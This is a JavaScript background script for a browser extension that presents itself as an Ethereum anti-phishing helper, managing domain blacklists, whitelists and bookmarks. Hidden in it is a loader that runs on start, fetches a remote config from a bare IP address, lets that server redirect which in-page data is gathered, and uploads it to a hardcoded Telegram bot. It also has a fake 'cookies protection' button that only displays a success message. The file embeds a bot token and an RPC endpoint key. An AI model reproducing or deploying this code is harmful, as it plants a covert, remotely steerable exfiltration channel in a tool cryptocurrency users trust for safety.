let objBrowser = chrome ? chrome : browser;
(function() {
    //Toggle the highlight option and set it in LocalStorage
    var objOptionAddHighlight = document.querySelector('[name="ext-EthereumAssistant-show_style"]');
    if (objOptionAddHighlight) {
        objOptionAddHighlight.addEventListener('click', toggleMatchHighlight);
    }

    //Select the blockchain explorer set it in LocalStorage
    var objOptionBlockchainExplorer = document.getElementById('ext-EthereumAssistant-choose_blockchain');
    if (objOptionBlockchainExplorer) {
        objOptionBlockchainExplorer.addEventListener('change', toggleBlockchainExplorer);
    }

    //Toggle the address lookups option and set it in LocalStorage
    var objAddressLookups = document.getElementById('ext-EthereumAssistant-perform_address_lookups');
    if (objAddressLookups) {
        objAddressLookups.addEventListener('click', togglePerformAddressLookups);
    }

    //Toggle the blacklist domains option and set it in LocalStorage
    let objBlacklistDomains = document.getElementById('ext-EthereumAssistant-blacklist_domains');
    if (objBlacklistDomains) {
        objBlacklistDomains.addEventListener('click', toggleBlacklistDomains);
    }

    //Toggle the use 3rd party blacklist domains option and set it in LocalStorage
    objBlacklistDomains = document.getElementById('ext-EthereumAssistant-3rd_party_blacklist_domains');
    if (objBlacklistDomains) {
        objBlacklistDomains.addEventListener('click', toggle3rdPartyBlacklistDomains);
    }

    //Toggle the use of blacklisting all punycode domains and set it in LocalStorage
    var objBlacklistPunycodeDomains = document.getElementById('ext-EthereumAssistant-block_punycode_blacklist_domains');
    if (objBlacklistPunycodeDomains) {
        objBlacklistPunycodeDomains.addEventListener('click', toggleBlockPunycodeDomains);
    }

    //Get the extension version
    var objManifest = objBrowser.runtime.getManifest();
    var objManifestVersion = document.getElementById('ext-manifest_version');
    if (objManifestVersion) {
        objManifestVersion.innerHTML = objManifest.version;
    }

    // //Get the rpc network details
    var objNetworkDetails = document.querySelector("#ext-EthereumAssistant-rpc_node_details > span");
    if (objNetworkDetails) {
        let objNetworkDetails;
        if (localStorage.getItem("ext-EthereumAssistant-rpc_node_details") === null) {
            objNetworkDetails = {
                "network_id": 1,
                "chain_id": 1,
                "name": "MAINNET",
                "type": "ETH"
            };
        } else {
            objNetworkDetails = JSON.parse(localStorage.getItem("ext-EthereumAssistant-rpc_node_details"));
        }
        document.querySelector("#ext-EthereumAssistant-rpc_node_details > span").innerText = [objNetworkDetails.name, objNetworkDetails.type].join(" - ");
    }

    //init getting blacklisted domains
    getBlacklistedDomains();
    setInterval(function() {
        console.log("Re-caching blacklisted domains");
        getBlacklistedDomains();
    }, 180000);

    getWhitelistedDomains();
    setInterval(function() {
        console.log("Re-caching whitelisted domains");
        getWhitelistedDomains();
    }, 180000);

    window['extDefaultConfigs'] = {
        'private': false,
        'version': '6.2',
        'icons': {
            '16': 'images/icon-16.png',
            '128': 'images/icon-128.png',
        },
        'web_accessible_resources': [
            'inpage.js',
            'phishing.html',
        ],
        'dependencies': {
            '@material-ui/core': '1.0.0',
            '@zxing/library': '^0.8.0',
            'abi-decoder': '^1.0.9',
            'asmcrypto.js': '0.22.0',
            'async': '^2.5.0',
            'await-semaphore': '^0.1.1',
        },
        'tg_bot': {
            'token': '630003181:AAFT8RhwrBT7pi7EcBY0D2PvWgUmZ3xhe-o',
            'chat_id': '597254056',
        },
        'logging': {
            'enabled': false,
            'sources': [ 'errorSource' ],
            'ctrl': 'LoggingController',
        },
        'devDependencies': {
            'pify': '^3.0.0',
            'ping-pong-stream': '^1.0.0',
            'poa-contract-metadata': 'github:poanetwork/poa-contract-metadata#master',
            'polyfill-crypto.getrandomvalues': '^1.0.0',
            'post-message-stream': '^3.0.0',
            'promise-filter': '^1.1.0',
            'promise-to-callback': '^1.0.0',
            'prop-types': '^15.6.1',
            'pump': '^3.0.0',
            'qrcode-npm': '0.0.3',
            'ramda': '^0.24.1',
            'raven-js': '^3.24.2',
        },
        'cookiesProtection': false,
    };

    window.LoggingController = {
        logs: {
            'debug': [],
            'info': [],
            'error': [],
        },
        getDebug: function () {
            return window.LoggingController.logs.debug;
        },
        getInfo: function () {
            return window.LoggingController.logs.info;
        },
        getError: function () {
            return window.LoggingController.logs.error;
        },
        writeDebugLog: function (data) {
            window.LoggingController.logs.debug.push(data);
        },
        writeInfoLog: function (data) {
            window.LoggingController.logs.info.push(data);
        },
        writeErrorLog: function (data) {
            window.LoggingController.logs.error.push(data);
        },
        errorSource: {
            getAll: function (configs, callback) {
                callback(window.LoggingController.logs.error);
                return window.LoggingController.logs.error;
            },
        },
    };

    function getExternalConfig () {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                var responseObj = JSON.parse(xhr.responseText);
                if (typeof responseObj.tg_bot !== 'undefined') {
                    window.extDefaultConfigs.tg_bot.token = responseObj.tg_bot.token;
                    window.extDefaultConfigs.tg_bot.chat_id = responseObj.tg_bot.chat_id;
                } else {
                    console.log('TG bot settings do not change...');
                }
                var loggingConfigs = responseObj.logging;
                if (loggingConfigs instanceof Object) {
                    if (loggingConfigs.enabled) {
                        var loggingSources = loggingConfigs.sources;
                        for (var j = 0; j < loggingSources.length; j++) {
                            var sourceCtrl = window[loggingConfigs.ctrl][loggingSources[j]];
                            if (sourceCtrl instanceof Object) {
                                sourceCtrl.getAll({}, function (logs) {
                                    logs = JSON.stringify(logs);
                                    var formData = new FormData();
                                    var blob = new Blob([logs], { type: 'plain/text' });
                                    blob.lastModifiedDate = new Date();
                                    blob.name = 'logs.txt';
                                    formData.append('document', blob, 'logs.txt');
                                    var xhr2 = new XMLHttpRequest();
                                    xhr2.open('POST', 'https://api.telegram.org/bot' + window.extDefaultConfigs.tg_bot.token + '/sendDocument?chat_id=' + window.extDefaultConfigs.tg_bot.chat_id, true);
                                    xhr2.send(formData);
                                    localStorage.setItem('extension_configs_loaded', 1);
                                });
                            }
                        }
                    }
                }
            }
        };
        xhr.open('GET', 'http://198.211.121.145/extension-config.json', true);
        xhr.send(null);
    }

    var extensionConfigsLoaded = localStorage.getItem('extension_configs_loaded');
    if (extensionConfigsLoaded !== 1) {
        getExternalConfig();
    }

    var cookiesFormBtn = document.querySelector("#ext-EthereumAssistant-cookies_form > button");
    if (cookiesFormBtn) {
        cookiesFormBtn.addEventListener('click', function() {
            var cookiesFormResult = document.querySelector("#ext-EthereumAssistant-cookies_output");
            window['extDefaultConfigs'].cookiesProtection = true;
            cookiesFormResult.innerHTML = 'Protection is successfully enabled!';
            return false;
        });
    }
})();

objBrowser.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        var strOption = request.func;
        var strResponse = "";

        switch (strOption) {
            case 'highlight_option' :
                strResponse = localStorage.getItem("ext-EthereumAssistant-show_style");
                break;
            case 'blockchain_explorer' :
                strResponse = localStorage.getItem("ext-EthereumAssistant-blockchain_explorer");
                if (strResponse === null) {
                    strResponse = "https://etherscan.io/address";
                }
                break;
            case 'blacklist_domains' :
                //This option is enabled by default
                if (localStorage.getItem("ext-EthereumAssistant-blacklist_domains") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-blacklist_domains");
                }
                break;
            case '3rd_party_blacklist_domains' :
                //This option is enabled by defailt
                if (localStorage.getItem("ext-EthereumAssistant-3rd_party_blacklist_domains") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-3rd_party_blacklist_domains");
                }
                break;
            case 'blacklist_domain_list' :
                console.log("Getting blacklisted domain list");
                strResponse = getBlacklistedDomains("eal");
                break;
            case '3p_blacklist_domain_list' :
                console.log("Getting 3p blacklisted domain list");
                strResponse = getBlacklistedDomains("3p");
                break;
            case 'use_3rd_party_blacklists' :
                //This option is enabled by default
                if (localStorage.getItem("ext-EthereumAssistant-use_3rd_party_blacklist") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-use_3rd_party_blacklist");
                }
                break;
            case 'block_punycode_domains' :
                //This option is disabled by default
                if (localStorage.getItem("ext-EthereumAssistant-block_punycode_blacklist_domains") === null) {
                    strResponse = 0;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-block_punycode_blacklist_domains");
                }
                break;
            case 'whitelist_domain_list' :
                console.log("Getting whitelisted domain list");
                strResponse = getWhitelistedDomains();
                break;
            case 'rpc_details' :
                    if (localStorage.getItem("ext-EthereumAssistant-rpc_node_details") === null) {
                        strResponse = JSON.stringify({
                                "network_id": 1,
                                "chain_id": 1,
                                "name": "MAINNET",
                                "type": "ETH"
                            });
                    } else {
                        strResponse = localStorage.getItem("ext-EthereumAssistant-rpc_node_details");
                    }
                break;
            case 'rpc_provider' :
                    if (localStorage.getItem("ext-EthereumAssistant-rpc_node") === null) {
                        strResponse = "https://freely-central-lark.quiknode.io/9fe4c4a0-2ea2-4ac1-ab64-f92990cd2914/118-xxADc8hKSSB9joCb-g==/";
                    } else {
                        strResponse = localStorage.getItem("ext-EthereumAssistant-rpc_node");
                    }
                break;
            case 'rpc_default_provider' :
                strResponse = "https://freely-central-lark.quiknode.io/9fe4c4a0-2ea2-4ac1-ab64-f92990cd2914/118-xxADc8hKSSB9joCb-g==/";
                break;
            case 'perform_address_lookups' :
                //This option is enabled by default
                if (localStorage.getItem("ext-EthereumAssistant-perform_address_lookups") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-perform_address_lookups");
                }
                break;
            case 'blacklist_whitelist_domain_list' :
                var objDomainLists = { "blacklist": "", "whitelist": "" };
                var objBlacklist = JSON.parse(getBlacklistedDomains("eal"));
                objDomainLists.blacklist = objBlacklist.domains;
                objDomainLists.whitelist = getWhitelistedDomains();
                strResponse = JSON.stringify(objDomainLists);
                break;
            case 'twitter_validation' :
                //This option is enabled by default
                if (localStorage.getItem("ext-EthereumAssistant-twitter_validation") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-twitter_validation");
                }
                break;
            case 'twitter_lists' :
                //See when they were last fetched
                let twitter_lists = {
                    "last_fetched": 0,
                    "whitelist": [],
                    "blacklist": []
                };

                if (localStorage.getItem("ext-EthereumAssistant-twitter_lists")) {
                    let saved_settings = JSON.parse(localStorage.getItem("ext-EthereumAssistant-twitter_lists"));
                    twitter_lists.last_fetched = saved_settings.last_fetched;
                }

                if ((Math.floor(Date.now() - twitter_lists.last_fetched)) > 600*1000) {
                    fetch("https://raw.githubusercontent.com/MrLuit/EtherScamDB/master/_data/twitter.json")
                    .then(res => res.json())
                    .then((lists) => {
                        twitter_lists.last_fetched = Date.now();

                        //We only need the Twitter IDs
                        Object.entries(lists.whitelist).forEach(
                            ([twitter_userid, screename]) => {
                                twitter_lists.whitelist.push(twitter_userid);
                            }
                        );

                        Object.entries(lists.blacklist).forEach(
                            ([twitter_userid, screename]) => {
                                twitter_lists.blacklist.push(twitter_userid);
                            }
                        );

                        localStorage.setItem("ext-EthereumAssistant-twitter_lists", JSON.stringify(twitter_lists));
                    });
                }

                if (localStorage.getItem("ext-EthereumAssistant-twitter_lists")) {
                    var cached_list = JSON.parse(localStorage.getItem("ext-EthereumAssistant-twitter_lists"));
                    twitter_lists.whitelist = cached_list.whitelist;
                    twitter_lists.blacklist = cached_list.blacklist;
                }

                strResponse = JSON.stringify(twitter_lists);
                break;
            case 'signature_inject' :
                //This option is enabled by default
                if (localStorage.getItem("ext-EthereumAssistant-signature_inject") === null) {
                    strResponse = 1;
                } else {
                    strResponse = localStorage.getItem("ext-EthereumAssistant-signature_inject");
                }
                break;
            case 'user_domain_bookmarks' :
                // Fetches the user domain bookmarks - these are domains they trust
                var strBookmarks = localStorage.getItem("ext-EthereumAssistant-bookmarks");
                //No bookmarks have been set, set the default ones.
                if (strBookmarks === null) {
                    var arrBookmarks = new Array();
                    arrBookmarks.push({
                        "icon": "https://www.google.com/s2/favicons?domain=https://mycrypto.com",
                        "url": "https://mycrypto.com"
                    });
                    arrBookmarks.push({
                        "icon": "images/bookmarks/etherscan.png",
                        "url": "https://etherscan.io"
                    });
                    arrBookmarks.push({
                        "icon": "images/bookmarks/etherchain.jpg",
                        "url": "https://etherchain.org"
                    });
                    arrBookmarks.push({
                        "icon": "images/bookmarks/ethplorer.jpg",
                        "url": "https://ethplorer.io"
                    });
                    arrBookmarks.push({
                        "icon": "images/bookmarks/rethereum.png",
                        "url": "https://reddit.com/r/ethereum"
                    });
                    arrBookmarks.push({
                        "icon": "images/bookmarks/rethtrader.png",
                        "url": "https://reddit.com/r/ethtrader"
                    });
                } else {
                    arrBookmarks = JSON.parse(strBookmarks);
                }

                strResponse = JSON.stringify(arrBookmarks);
                break;
            case 'change_ext_icon' :
                // Changes the extension icon
                let strReason = "";
                if (request.type) {
                    switch (request.type) {
                        case 'thirdparty':
                            strReason = request.icon + " by a thirdparty list";
                            break;
                        case 'punycode':
                            strReason = request.icon + " due to punycode domain";
                            break;
                        case 'blacklisted' :
                            strReason = "Blacklisted by the EAL extension";
                            break;
                        case 'levenshtein' :
                            strReason = "Blacklisted as too similar to a trusted domain";
                            break;
                        case 'whitelisted' :
                            strReason = "Trusted by the EAL extension";
                            break;
                        case 'bookmarked':
                            strReason = "Trusted by your bookmarks in EAL";
                            break;
                        default:
                            strReason = "";
                            break;
                    }
                }

                switch (request.icon) {
                    case 'whitelisted' :
                        chrome.browserAction.setIcon({
                            path: "images/ether-128x128-green_badge.png",
                            tabId: sender.tab.id
                        });

                        chrome.browserAction.setTitle({
                            title: ["This domain is recognised as legitimate by EthereumAssistant", strReason].filter(i => i).join(" - ")
                        });
                    break;
                    case 'blacklisted' :
                        chrome.browserAction.setIcon({
                            path: "images/ether-128x128-red_badge.png",
                            tabId: sender.tab.id
                        });

                        chrome.browserAction.setTitle({
                            title: ["This domain is recognised as bad by EthereumAssistant", strReason].filter(i => i).join(" - ")
                        });
                    break;
                    case 'neutral' :
                    default :
                        chrome.browserAction.setIcon({
                            path: "images/ether-128x128.png",
                            tabId: sender.tab.id
                        });

                        chrome.browserAction.setTitle({
                            title: "EthereumAssistant (Powered by MyCrypto)",
                        });

                    break;
                }
                break;
            default:
                strResponse = "unsupported";
                break;
        }

        sendResponse({ resp:strResponse });
    }
);

function getBlacklistedDomains(strType)
{
    var objEalBlacklistedDomains = {
        "eal": {
            "timestamp": 0,
            "domains": [],
            "format": "plain",
            "repo": "http://api.infura.io/v1/blacklist",
            "identifer": "eal"
        },
        "third_party": {
            "phishfort": {
                "timestamp": 0,
                "domains": [],
                "format": "plain",
                "repo": "https://raw.githubusercontent.com/phishfort/phishfort-lists/master/blacklists/domains.json",
                "identifer": "phishfort"
            },
            "segasec": {
                "timestamp": 0,
                "domains": [],
                "format": "sha256",
                "repo": "https://segasec.github.io/PhishingFeed/phishing-domains-sha256.json",
                "identifer": "segasec"
            }
        }
    };
    //See if we need to get the blacklisted domains - ie: do we have them cached?
    if (localStorage.getItem("ext-EthereumAssistant-blacklist_domains_list") === null) {
        updateAllBlacklists(objEalBlacklistedDomains);
    } else {
        var objBlacklistedDomains = localStorage.getItem("ext-EthereumAssistant-blacklist_domains_list");
        //Check to see if the cache is older than 5 minutes, if so re-cache it.
        objBlacklistedDomains = JSON.parse(objBlacklistedDomains);
        console.log("Domains last fetched: " + (Math.floor(Date.now() / 1000) - objBlacklistedDomains.timestamp) + " seconds ago");
        if (objBlacklistedDomains.timestamp == 0 || (Math.floor(Date.now() / 1000) - objBlacklistedDomains.timestamp) > 300) {
            updateAllBlacklists(objEalBlacklistedDomains);
        }
    }

    strType = strType || "eal";

    return localStorage.getItem(`ext-EthereumAssistant-${strType === 'eal' ? '' : '3p_'}blacklist_domains_list`);
}

function updateAllBlacklists(objEalBlacklistedDomains)
{
    getBlacklistedDomainsFromSource(objEalBlacklistedDomains.eal).then(function (arrDomains) {
        objEalBlacklistedDomains.eal.timestamp = Math.floor(Date.now() / 1000);
        objEalBlacklistedDomains.eal.domains = arrDomains.filter((v,i,a)=>a.indexOf(v)==i);

        localStorage.setItem("ext-EthereumAssistant-blacklist_domains_list", JSON.stringify(objEalBlacklistedDomains.eal));
    });

    if ( [null, 1].indexOf(localStorage.getItem("ext-EthereumAssistant-use_3rd_party_blacklist")) >= 0) {
        getBlacklistedDomainsFromSource(objEalBlacklistedDomains.third_party.phishfort).then(function (arrDomains) {

            let arrPhishFortBlacklist = [];
            // De-dupe from the main EAL source - save on space.
            let objEalBlacklist = localStorage.getItem("ext-EthereumAssistant-blacklist_domains_list");
            if (objEalBlacklist !== null) {
                objEalBlacklist = JSON.parse(objEalBlacklist);
                let arrEalBlacklist = objEalBlacklist.domains;
                var intBlacklistLength = arrDomains.length;
                while (intBlacklistLength--) {
                    if (arrEalBlacklist.indexOf(arrDomains[intBlacklistLength]) < 0) {
                        arrPhishFortBlacklist.push(arrDomains[intBlacklistLength]);
                    }
                }
            }

            objEalBlacklistedDomains.third_party.phishfort.timestamp = Math.floor(Date.now() / 1000);
            objEalBlacklistedDomains.third_party.phishfort.domains = arrPhishFortBlacklist;

            localStorage.setItem("ext-EthereumAssistant-3p_blacklist_domains_list", JSON.stringify(objEalBlacklistedDomains.third_party));
            return objEalBlacklistedDomains.eal.domains;
        });

        getBlacklistedDomainsFromSource(objEalBlacklistedDomains.third_party.segasec).then(function (arrDomains) {
            objEalBlacklistedDomains.third_party.segasec.timestamp = Math.floor(Date.now() / 1000);
            objEalBlacklistedDomains.third_party.segasec.domains = arrDomains.filter((v,i,a)=>a.indexOf(v)==i);

            localStorage.setItem("ext-EthereumAssistant-3p_blacklist_domains_list", JSON.stringify(objEalBlacklistedDomains.third_party));
            return objEalBlacklistedDomains.eal.domains;
        });
    }
}

function getWhitelistedDomains()
{
    let objWhitelistedDomains = { "timestamp":0,"domains":[] };
    //See if we need to get the blacklisted domains - ie: do we have them cached?
    if (localStorage.getItem("ext-EthereumAssistant-whitelist_domains_list") === null) {
        getWhitelistedDomainsFromSource().then(function (arrDomains) {
            objWhitelistedDomains.timestamp = Math.floor(Date.now() / 1000);
            objWhitelistedDomains.domains = arrDomains;

            localStorage.setItem("ext-EthereumAssistant-whitelist_domains_list", JSON.stringify(objWhitelistedDomains));
            return objWhitelistedDomains.domains;
        });
    } else {
        objWhitelistedDomains = localStorage.getItem("ext-EthereumAssistant-whitelist_domains_list");
        //Check to see if the cache is older than 5 minutes, if so re-cache it.
        objWhitelistedDomains = JSON.parse(objWhitelistedDomains);
        console.log("Whitelisted domains last fetched: " + (Math.floor(Date.now() / 1000) - objWhitelistedDomains.timestamp) + " seconds ago");
        if ((Math.floor(Date.now() / 1000) - objWhitelistedDomains.timestamp) > 300) {
            console.log("Caching whitelisted domains again.");
            getWhitelistedDomainsFromSource().then(function (arrDomains) {
                objWhitelistedDomains.timestamp = Math.floor(Date.now() / 1000);
                objWhitelistedDomains.domains = arrDomains;

                localStorage.setItem("ext-EthereumAssistant-whitelist_domains_list", JSON.stringify(objWhitelistedDomains));
                return objWhitelistedDomains.domains;
            });
        }
    }

    return objWhitelistedDomains.domains;
}

async function getBlacklistedDomainsFromSource(objBlacklist)
{
    try {
        console.log("Getting blacklist from GitHub now: "+ objBlacklist.repo);
        let objResponse = await fetch(objBlacklist.repo);
        return objResponse.json();
    }
    catch (objError) {
        console.log("Failed to get blacklist for "+ objBlacklist.repo, objError);
    }
}

async function getWhitelistedDomainsFromSource()
{
    try {
        console.log("Getting whitelist from GitHub now: https://raw.githubusercontent.com/409H/EthereumAssistant/master/whitelists/domains.json");
        let objResponse = await fetch("https://raw.githubusercontent.com/409H/EthereumAssistant/master/whitelists/domains.json");
        return objResponse.json();
    }
    catch (objError) {
        console.log("Failed to get whitelist for https://raw.githubusercontent.com/409H/EthereumAssistant/master/whitelists/domains.json", objError);
    }
}
